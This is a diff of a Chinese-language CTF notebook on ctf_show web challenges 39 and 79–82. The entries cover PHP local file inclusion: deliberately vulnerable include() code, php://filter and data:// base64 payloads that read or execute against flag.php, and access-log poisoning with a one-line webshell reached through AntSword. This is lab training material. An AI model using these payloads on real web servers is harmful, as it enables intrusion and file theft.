@@ -6367,7 +6367,7 @@ if(isset($_GET['c'])){
 
 
 
-### ctf_show web39
+### ctf_show web39 。。。
 
 ~~~php
  <?php
@@ -6439,6 +6439,115 @@ if(isset($_GET['file'])){
 **payload:**
 
 ~~~
-?file=php://filter/read=convert.base64-encode/reso
+?file=php://filter/read=convert.base64-encode/resource=flag.php
 ~~~
+
+### ctf_show web79
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:10:14
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:12:38
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file); //把php字符串替换成三个问号
+    include($file); //包含flag.php
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+尝试使用：
+
+>  data://text/plain;base64,
+
+payload:
+
+~~~
+?file=data://text/plain;base64,PD9waHAgCglzeXN0ZW0oImNhdCBmbGFnLnBocCIpOwo=
+~~~
+
+### ctf_show web80
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 11:26:29
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file); //过滤php
+    $file = str_replace("data", "???", $file); //过滤data
+    include($file);
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+
+
+利用文件包含的特性，会渲染任何文件类型为php类型并渲染；所以去访问`/var/log/ngin/access.log`，抓包修改UA值为一句话木马，蚁剑连接就可以成功
+
+![image-20220812124246065](E:\md笔记资料\CTF刷题WriteUp.assets\image-20220812124246065.png)
+
+![image-20220812124258539](E:\md笔记资料\CTF刷题WriteUp.assets\image-20220812124258539.png)
+
+### ctf_show web81
+
+
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-16 15:51:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+if(isset($_GET['file'])){
+    $file = $_GET['file'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    include($file);
+}else{
+    highlight_file(__FILE__);
+} 
+~~~
+
+看过滤条件可以和上一关一样，利用访问日志文件获得webshell
+
+### ctf_show web82 。。。
+
+> 利用条件竞争
+
+
 
